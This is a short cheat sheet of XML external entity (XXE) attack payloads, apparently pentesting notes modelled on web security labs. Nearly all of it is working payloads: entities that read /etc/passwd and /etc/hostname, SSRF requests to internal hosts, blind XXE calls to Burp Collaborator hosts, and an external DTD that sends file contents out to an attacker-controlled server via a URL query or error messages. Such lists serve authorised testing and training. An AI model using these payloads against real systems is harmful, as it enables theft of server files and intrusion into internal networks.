# XXE Payloads
### Normal Method
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  >> For retrieving server files.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website/"> ]>  >> For SSRF attack.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
&xxe;

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://x0yhzy601i8gxlhsy2md1wesxj3ar2fr.oastify.com"> %xxe; ]>  >> For Blind xxe via XML parameter entities.
```
### Exploiting blind XXE via external DTD server
Host this payload with burp collaborator in external DTD server.
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://uljekvrxmftdii2pjz7amtzpigo7c50u.oastify.com/?x=%file;'>">
%eval;
%exfil;
____________________________________________
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Now paste the external DTD server link in burpsuite
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
```
